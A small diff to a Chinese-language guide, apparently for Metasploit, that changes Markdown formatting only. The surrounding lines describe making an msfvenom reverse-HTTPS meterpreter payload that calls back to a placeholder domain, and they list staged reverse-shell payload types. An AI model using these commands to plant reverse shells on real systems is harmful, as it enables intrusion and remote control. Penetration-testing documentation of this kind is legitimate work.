@@ -20,7 +20,7 @@ cat cert.key cert.crt > cert.pem
 rm -f cert.key cert.crt
 ```
 
-其中```www.example.com```为回连域名或IP
+其中`www.example.com`为回连域名或IP
 
 # 生成payload
 
@@ -30,7 +30,7 @@ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=www.example.com LPORT=443
 
 支持的payload:
 
-|  Staged (payload.bat\|ps1\|txt\|exe):  |
+|  Staged (payload.bat&#124;ps1&#124;txt&#124;exe):  |
 |  :----  |
 |  windows/meterpreter/reverse_winhttps  |
 |  windows/meterpreter/reverse_https  |
@@ -59,4 +59,4 @@ run -j -z
 
 # 在MacOS上的tips
 
-使用完msfconsole后，会有残留进程，建议运行```msfdb stop```结束。
+使用完msfconsole后，会有残留进程，建议运行`msfdb stop`结束。
